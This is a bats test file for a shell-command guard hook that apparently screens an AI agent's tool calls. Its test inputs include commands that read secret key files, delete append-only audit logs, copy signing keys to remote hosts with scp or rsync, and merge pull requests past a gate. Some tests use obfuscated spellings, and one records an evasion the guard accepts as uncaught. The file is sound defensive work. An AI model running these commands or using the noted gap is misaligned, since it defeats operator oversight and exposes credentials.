#!/usr/bin/env bash

load test_helper

# `run --separate-stderr` needs bats >= 1.5.0.
bats_require_minimum_version 1.5.0

# Feed the guard a PreToolUse payload for a shell command and capture the
# verdict: exit 0 = pass, exit 2 = block (denial + remedy on stderr).
run_guard() {
  local json
  json=$(jq -n --arg c "$1" '{tool_input: {command: $c}}')
  run --separate-stderr bash "$BATS_TEST_DIRNAME/../scripts/pretool-guard.sh" <<<"$json"
}

# --- custody: operator-only verbs ---

@test "custody grant is blocked (mint authority stays with the operator)" {
  run_guard "custody grant -key tracker -actions read -ttl 8h"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"operator-only"* ]]
  [[ "$stderr" == *"Remedy:"* ]]
}

@test "custody grant after a newline is blocked (command position spans lines)" {
  run_guard "cd /repo
custody grant -key tracker -actions read -ttl 8h"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"operator-only"* ]]
}

@test "custody keys set is blocked (secret entry stays with the operator)" {
  run_guard "custody keys set -name tracker-pat"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"operator-only"* ]]
}

@test "custody.exe grant is blocked too" {
  run_guard "./custody.exe grant -key tracker -actions read -ttl 8h"
  [ "$status" -eq 2 ]
}

@test "custody read verbs pass" {
  run_guard "custody log -key tracker -since 24h"
  [ "$status" -eq 0 ]
  run_guard "custody explain -req req_abc123"
  [ "$status" -eq 0 ]
}

@test "paths that merely contain custody don't trip the verb rule" {
  run_guard "cat docs/features/custody/grant-notes.md"
  [ "$status" -eq 0 ]
}

# --- custody verbs: normalized spellings (case, quoted exe, split token) ---

@test "quoted exe + capitalized verb is blocked (PowerShell call operator)" {
  run_guard '& "custody.exe" Grant -key tracker -actions read -ttl 8h'
  [ "$status" -eq 2 ]
}

@test "quote-split verb is blocked" {
  run_guard 'custody gr""ant -key tracker -actions read -ttl 8h'
  [ "$status" -eq 2 ]
}

@test "env-indirected verb is NOT caught (accepted obfuscation under discipline)" {
  run_guard 'verb=grant; custody "$verb" -key tracker -actions read -ttl 8h'
  [ "$status" -eq 0 ]
}

# --- custody verbs: command position, not prose (P2 false-positive fix) ---

@test "the verb inside a commit message is NOT blocked" {
  run_guard 'git commit -m "document custody grant in the rulebook"'
  [ "$status" -eq 0 ]
}

@test "the verb inside a search string is NOT blocked" {
  run_guard 'rg "custody keys" docs'
  [ "$status" -eq 0 ]
}

@test "piped custody verb is still blocked (command position after |)" {
  run_guard "echo go | custody grant -key tracker -actions read -ttl 8h"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"operator-only"* ]]
}

@test "chained custody verb is still blocked (command position after &&)" {
  run_guard "cd /repo && custody keys set -name tracker-pat"
  [ "$status" -eq 2 ]
}

# --- custody: state dir ---

@test "touching custody state is blocked" {
  run_guard "cat ~/.custody/mint.key"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"custody state"* ]]
}

@test "windows-style custody state path is blocked" {
  run_guard 'type C:\Users\op\.custody\grants\cst_1.json'
  [ "$status" -eq 2 ]
}

@test "Join-Path-built quoted state path is blocked" {
  run_guard "Get-Content (Join-Path \$env:USERPROFILE '.custody\\mint.key')"
  [ "$status" -eq 2 ]
}

# --- custody: the brokered path stays open ---

@test "calls through the proxy pass" {
  run_guard 'curl -H "X-Custody-Grant: cst_abc" http://127.0.0.1:8127/tracker/rest/api/2/issue/PROJ-1'
  [ "$status" -eq 0 ]
}

# --- plaintext keys file: env-gated until drain ---

@test "keys-file read passes while GUARD_KEYS_DENY is unset" {
  run_guard "jq -r .vendor /c/Users/op/dev/repo/.keys"
  [ "$status" -eq 0 ]
}

@test "keys-file read is blocked when GUARD_KEYS_DENY=1" {
  GUARD_KEYS_DENY=1 run_guard "jq -r .vendor /c/Users/op/dev/repo/.keys"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"custody"* ]]
}

@test "uppercase .KEYS is blocked when enabled (case-insensitive)" {
  GUARD_KEYS_DENY=1 run_guard "Get-Content .KEYS"
  [ "$status" -eq 2 ]
}

@test "quote-split keys path is blocked when enabled" {
  GUARD_KEYS_DENY=1 run_guard 'jq -r .vendor "./.ke""ys"'
  [ "$status" -eq 2 ]
}

@test "keys-file rule doesn't match .keystore when enabled" {
  GUARD_KEYS_DENY=1 run_guard "ls app/.keystore"
  [ "$status" -eq 0 ]
}

# --- plaintext keys file: prose naming the file, not reading it (P2 fix) ---

@test "commit message naming .keys is NOT blocked even when enabled" {
  GUARD_KEYS_DENY=1 run_guard 'git commit -m "remove .keys"'
  [ "$status" -eq 0 ]
}

@test "PR body naming .keys is NOT blocked even when enabled" {
  GUARD_KEYS_DENY=1 run_guard 'gh pr create --title drain --body "deleted .keys"'
  [ "$status" -eq 0 ]
}

# --- bare gh pr merge: block the real subcommand, not the word `merge` ---

@test "bare gh pr merge is blocked" {
  run_guard "gh pr merge 42 --squash --admin --delete-branch"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"bypasses gate"* ]]
  [[ "$stderr" == *"Remedy:"* ]]
}

@test "gh -R o/r pr merge (repo flag before pr) is blocked" {
  run_guard "gh -R itsHabib/hooks pr merge 42 --squash"
  [ "$status" -eq 2 ]
}

@test "gh pr -R o/r merge (repo flag between pr and merge) is blocked" {
  run_guard "gh pr -R itsHabib/hooks merge 42 --squash"
  [ "$status" -eq 2 ]
}

@test "gate-emitted --match-head-commit merge passes" {
  run_guard "gh pr merge 42 --squash --admin --match-head-commit abc123"
  [ "$status" -eq 0 ]
}

@test "false positive: filename with gh-pr-merge segments passes" {
  run_guard "head tests/posttool-gh-pr-merge.bats"
  [ "$status" -eq 0 ]
}

@test "false positive: gh pr create with 'merge' in the body passes" {
  run_guard 'gh pr create --title fix --body "this reverts the bad merge from main"'
  [ "$status" -eq 0 ]
}

# --- gate substrate: anchored on the `gate/` parent, not on a home ---
#
# This rule was pinned to `pers/gate/state` while the substrate had already
# moved to ~/dev/gate/state, so it protected nothing for the entire time it
# read as protective. The tests below pin BOTH homes: the rule may not be
# re-narrowed to whichever path happens to be current.

@test "gate state: the live ~/dev/gate/state is blocked" {
  run_guard "rm -rf ~/dev/gate/state"
  [ "$status" -eq 2 ]
  [[ "$stderr" == *"append-only"* ]]
  [[ "$stderr" == *"Remedy:"* ]]
}

@test "gate state: the legacy ~/pers/gate/state stays blocked" {
  run_guard "rm -rf ~/pers/gate/state"
  [ "$status" -eq 2 ]
}

@test "gate state: the hash-chained log itself is blocked" {
  run_guard "rm ~/dev/gate/state/log.jsonl"
  [ "$status" -eq 2 ]
}

@test "gate state: mv and cp are blocked, not only rm" {
  run_guard "mv ~/dev/gate/state /tmp/stash"
  [ "$status" -eq 2 ]
  run_guard "cp -r ~/dev/gate/state /tmp/stash"
  [ "$status" -eq 2 ]
}

@test "gate keys: the signing keys are blocked" {
  run_guard "rm -rf ~/dev/gate/keys"
  [ "$status" -eq 2 ]
}

@test "gate state: reading the audit log passes" {
  run_guard "grep run_abc ~/dev/gate/state/log.jsonl"
  [ "$status" -eq 0 ]
}

@test "false positive: gate/internal/state is source, not substrate" {
  run_guard "rm -rf ~/dev/gate/internal/state"
  [ "$status" -eq 0 ]
}

@test "false positive: a sibling named state_backup is not the substrate" {
  run_guard "rm -rf ~/dev/gate/state_backup"
  [ "$status" -eq 0 ]
}

@test "false positive: a word merely ending in gate is not the substrate" {
  # Without a leading \b the rule substring-matches any word ending in "gate" —
  # aggregate/state, delegate/keys — and denies unrelated commands.
  run_guard "rm -rf ~/repos/aggregate/state"
  [ "$status" -eq 0 ]
  run_guard "rm -rf ~/repos/delegate/keys"
  [ "$status" -eq 0 ]
}

@test "false positive: a verb hidden inside a word does not trip the rule" {
  # "rm" inside "normalization" is not the rm verb. Without a leading boundary
  # on the verb alternation, this denied a legitimate gate judge call whose
  # -why text contained "normalization" followed by -state ~/dev/gate/state
  # (2026-08-12).
  run_guard 'gate judge -run run_abc -grant grt_x -why "score normalization applied" -state ~/dev/gate/state'
  [ "$status" -eq 0 ]
  run_guard 'gate gate -repo o/r -pr 5 -grant grt_x -state ~/dev/gate/state'
  [ "$status" -eq 0 ]
}

@test "gate state: verb at start of command still blocked after boundary fix" {
  run_guard "rm ~/dev/gate/keys/signing.key"
  [ "$status" -eq 2 ]
}

@test "gate keys: remote copy verbs are blocked in their own right" {
  # The unanchored regex blocked scp only by accident — `cp` matched inside it.
  # Anchoring the verb costs that, so every remote-copy verb is listed
  # explicitly; dropping one is a silent key-exfiltration path.
  run_guard "scp ~/dev/gate/keys/signing.key host:/tmp/key"
  [ "$status" -eq 2 ]
  run_guard "rsync -a ~/dev/gate/keys/ host:/tmp/keys/"
  [ "$status" -eq 2 ]
  run_guard "rsync -a ~/dev/gate/state/ host:/tmp/state/"
  [ "$status" -eq 2 ]
}

@test "gate keys: the PowerShell verb trio is complete" {
  run_guard 'Copy-Item C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
  [ "$status" -eq 2 ]
  run_guard 'Move-Item C:\Users\me\dev\gate\keys\signing.key C:\tmp\k'
  [ "$status" -eq 2 ]
  run_guard 'Remove-Item C:\Users\me\dev\gate\state\log.jsonl'
  [ "$status" -eq 2 ]
}
